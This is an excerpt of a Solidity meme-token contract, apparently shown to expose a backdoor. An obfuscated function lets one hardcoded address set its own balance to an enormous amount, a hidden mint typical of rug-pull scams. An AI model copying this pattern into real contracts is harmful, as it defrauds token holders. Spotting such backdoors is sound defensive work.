...
contract MEMEToken is Ownable {
    ...
    function pepepogAdddmmm() external {
        ...
        if (_cwojakpepe776!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe776 == tswojaks){
            _balances[_cwojakpepe776] = peedAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe776 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
